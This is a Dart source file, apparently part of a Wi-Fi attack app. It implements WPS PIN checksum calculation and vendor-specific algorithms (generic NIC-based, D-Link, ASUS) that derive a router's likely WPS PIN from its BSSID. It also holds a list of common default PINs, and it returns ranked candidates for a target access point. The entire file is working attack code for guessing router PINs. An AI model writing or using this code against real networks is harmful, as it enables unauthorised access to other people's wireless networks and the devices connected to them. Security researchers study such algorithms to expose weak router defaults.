// domain/usecases/compute_wps_pin.dart

/// WPS PIN Checksum & Generator algorithms (Ported from wifit3 / 3WiFi / Stefan Viehböck research)
class ComputeWpsPin {
  /// Compute 802.11 WSC / WPS PIN Checksum (Luhn-like 8th digit).
  static int pinChecksum(int pin7) {
    int accum = 0;
    int currentPin = pin7;
    while (currentPin > 0) {
      accum += 3 * (currentPin % 10);
      currentPin ~/= 10;
      accum += (currentPin % 10);
      currentPin ~/= 10;
    }
    return (10 - (accum % 10)) % 10;
  }

  static String finalizePin(int raw7) {
    final seven = raw7 % 10000000;
    final formatted7 = seven.toString().padLeft(7, '0');
    final check = pinChecksum(int.parse(formatted7));
    return '$formatted7$check';
  }

  /// ComputePIN 24-bit NIC algorithm (Broadcom / Atheros / Ralink)
  static String pin24(String bssid) {
    final cleanHex = bssid.replaceAll(RegExp(r'[^0-9a-fA-F]'), '');
    if (cleanHex.length < 12) return '12345670';
    final nicBytes = cleanHex.substring(6);
    final nic = int.parse(nicBytes, radix: 16);
    return finalizePin(nic);
  }

  /// D-Link WPS PIN Generator (DIR-615, DIR-645, etc.)
  static String pinDlink(String bssid) {
    final cleanHex = bssid.replaceAll(RegExp(r'[^0-9a-fA-F]'), '');
    if (cleanHex.length < 12) return '12345670';
    final nicBytes = cleanHex.substring(6);
    int nic = int.parse(nicBytes, radix: 16);
    
    int pin = nic ^ 0x55AA55;
    pin ^= (((pin & 0x0F) << 4) + ((pin & 0x0F) << 8) + ((pin & 0x0F) << 12) + ((pin & 0x0F) << 16) + ((pin & 0x0F) << 20));
    pin %= 10000000;
    if (pin < 1000000) {
      pin += (pin % 9) * 1000000 + 1000000;
    }
    return finalizePin(pin);
  }

  /// ASUS Router WPS PIN Generator
  static String pinAsus(String bssid) {
    final cleanHex = bssid.replaceAll(RegExp(r'[^0-9a-fA-F]'), '');
    if (cleanHex.length < 12) return '12345670';
    final b = List<int>.generate(6, (i) => int.parse(cleanHex.substring(i * 2, i * 2 + 2), radix: 16));
    
    int sum = b.sublist(1).reduce((a, b) => a + b);
    String digits = '';
    for (int i = 0; i < 7; i++) {
      int val = (b[i % 6] + b[5]) % (10 - (i + sum) % 7);
      digits += val.toString();
    }
    return finalizePin(int.parse(digits));
  }

  /// Generate all candidate WPS PINs ranked by likelihood for a target Access Point
  List<String> getCandidates(String bssid, {String? vendor, String? ssid}) {
    final List<String> pins = [];
    
    // Add primary computed PINs
    pins.add(pin24(bssid));
    pins.add(pinDlink(bssid));
    pins.add(pinAsus(bssid));

    // Common Fallback PINs
    pins.addAll(['12345670', '37380342', '20172527', '12885381', '01756401', '11866428']);

    return pins.toSet().toList(); // Deduplicate
  }
}
